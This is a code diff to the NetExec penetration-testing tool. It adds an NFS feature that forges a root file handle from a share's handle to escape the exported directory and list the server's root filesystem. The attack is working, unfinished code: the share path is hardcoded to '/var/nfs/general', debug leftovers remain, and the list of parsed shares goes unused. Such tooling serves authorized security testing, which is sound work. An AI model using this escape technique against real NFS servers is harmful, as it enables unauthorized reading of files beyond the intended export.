@@ -1,11 +1,25 @@
 from nxc.connection import connection
 from nxc.logger import NXCAdapter
 from nxc.helpers.logger import highlight
-from pyNfsClient import Portmap, Mount, NFSv3, NFS_PROGRAM, NFS_V3, ACCESS3_READ, ACCESS3_MODIFY, ACCESS3_EXECUTE, NFSSTAT3
+from pyNfsClient import (
+    Portmap,
+      Mount, 
+      NFSv3, 
+      NFS_PROGRAM, 
+      NFS_V3, 
+      ACCESS3_READ, 
+      ACCESS3_MODIFY, 
+      ACCESS3_EXECUTE, 
+      NFSSTAT3,
+      NF3DIR,
+      )
 import re
 import uuid
 import math
 import os
+
+
+from pprint import pprint
 
 
 class nfs(connection):
@@ -389,6 +403,47 @@ class nfs(connection):
         else:
             self.logger.highlight(f"File {local_file_path} successfully uploaded to {remote_file_path}")
 
+    def get_root_handle(self, file_handle):
+        """
+        Get the root handle of the NFS share
+        Sources: 
+        https://github.com/spotify/linux/blob/master/include/linux/nfsd/nfsfh.h
+        https://github.com/hvs-consulting/nfs-security-tooling/blob/main/nfs_analyze/nfs_analyze.py
+
+        Usually:
+        - 1 byte: 0x01 fb_version
+        - 1 byte: 0x00 fb_auth_type, can be 0x00 (no auth) and 0x01 (some md5 auth)
+        - 1 byte: 0xXX fb_fsid_type -> determines the legth of the fsid
+        - 1 byte: 0xXX fb_fileid_type
+        """
+        fh = bytearray(file_handle)
+        # Concatinate old header with root Inode             and Generation id
+        return bytes(fh[:3] + int.to_bytes(NF3DIR) + fh[4:] + b"\x02\x00\x00\x00" + b"\x00\x00\x00\x00")
+
+    def ls(self):
+        nfs_port = self.portmap.getport(NFS_PROGRAM, NFS_V3)
+        self.nfs3 = NFSv3(self.host, nfs_port, self.args.nfs_timeout, self.auth)
+        self.nfs3.connect()
+
+        output_export = str(self.mount.export())
+
+        reg = re.compile(r"ex_dir=b'([^']*)'")  # Get share names
+        shares = list(reg.findall(output_export))
+
+        for share in ["/var/nfs/general"]:
+            mount_info = self.mount.mnt(share, self.auth)
+            fh = mount_info["mountinfo"]["fhandle"]
+            root_fh = self.get_root_handle(fh)
+
+            # pprint(self.nfs3.readdir(root_fh, auth=self.auth))
+
+            content = self.nfs3.readdir(root_fh, auth=self.auth)["resok"]["reply"]["entries"]
+            self.logger.success(f"Using share '{share}' for escape to root fs")
+            while content:
+                for entry in content:
+                    self.logger.highlight(f"{entry['name'].decode()}")
+                    content = entry["nextentry"] if "nextentry" in entry else None
+            self.mount.umnt(self.auth)
 
 def convert_size(size_bytes):
     if size_bytes == 0:
